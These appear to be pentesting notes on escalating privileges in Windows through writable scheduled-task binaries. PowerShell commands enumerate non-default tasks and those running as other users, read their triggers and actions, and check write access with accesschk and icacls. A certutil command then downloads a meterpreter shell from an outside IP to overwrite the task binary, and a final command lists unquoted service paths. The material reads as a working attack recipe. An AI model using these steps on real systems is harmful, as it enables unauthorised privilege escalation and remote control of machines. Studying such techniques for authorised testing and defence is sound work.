Get Schedule Tasks from within powershell

powershell Get-ScheduledTask

#We can remove all tasks located under the /Microsoft/Windows/ path, most of the time, it is the default scheduled tasks.

Get-ScheduledTask | Select * | ? {$_.TaskPath -notlike "\Microsoft\Windows\*"} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name="User";Expression={$_.Principal.userID}}
	
#now we can remove the tasks who are executed with the same privilege as our "lowuser" user

Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike "\Microsoft\Windows\*") -And ($_.Principal.UserId -notlike "*$env:UserName*")} | Format-Table -Property State, Actions, Date, Task
Path, TaskName, @{Name="User";Expression={$_.Principal.userID}}

#We can use this following PowerShell commands to get the interval of execution of the Task.

$task= Get-ScheduledTask -TaskName Task1
ForEach ($triger in $task.Triggers) { echo $triger.Repetition.Interval}

#We can find the actions of this task with these commands

$task= Get-ScheduledTask -TaskName Task1
ForEach ($action in $task.Actions) { Select $action.Execute}

#As a low privilege user we have to check if we can overwrite this file. Using icacls or accesschk64.exe

C:\Toolbox\accesschk64.exe -accepteula -wv lowuser C:\ScheduledTasks\Task1\something.exe

C:\Toolbox\icacls.exe C:\ScheduledTasks\Task1\something.exe

If we have write permission, we can replace the original something.exe binary by a meterpreter shell.

certutil -urlcache -split -f "http://192.168.230.130:8080/something.exe" C:\ScheduledTasks\Task1\something.exe

#Same as previously, let us see the interval and the action executed by Task2.

$task = Get-ScheduledTask -TaskName Task2
ForEach ($trigger in $task.Triggers) { echo $trigger.Repetition.Interval}
ForEach ($action in $task.Actions) { echo $action.Execute }



#Unquoted Service Path 

wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """


https://amonsec.net/2018/10/20/Common-Windows-Misconfiguration-Scheduled-Tasks.html







